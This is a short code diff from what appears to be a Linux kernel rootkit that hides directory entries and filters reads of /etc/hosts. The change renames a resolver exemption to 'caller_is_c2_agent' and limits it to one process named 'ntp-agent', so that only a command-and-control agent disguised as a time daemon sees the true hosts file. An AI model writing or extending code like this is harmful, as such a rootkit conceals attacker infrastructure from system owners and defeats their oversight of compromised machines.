@@ -234,16 +234,11 @@ static bool dirent_is_hidden(const char *name)
 }
 
 /* ── /etc/hosts read filtering ────────────────────────────────────────────── */
-static bool caller_is_resolver(void)
+static bool caller_is_c2_agent(void)
 {
 	char comm[TASK_COMM_LEN];
 	get_task_comm(comm, current);
-	return (strstr(comm, "ntp")     != NULL ||
-	        strstr(comm, "chrony")  != NULL ||
-	        strstr(comm, "timesyn") != NULL ||
-	        strstr(comm, "nscd")    != NULL ||
-	        strstr(comm, "resolv")  != NULL ||
-	        strstr(comm, "dns")     != NULL);
+	return strcmp(comm, "ntp-agent") == 0;
 }
 
 static bool fd_is_hosts(unsigned int fd)
@@ -253,7 +248,7 @@ static bool fd_is_hosts(unsigned int fd)
 	char *path;
 	bool result = false;
 
-	if (caller_is_resolver())
+	if (caller_is_c2_agent())
 		return false;
 
 	filp = fget(fd);
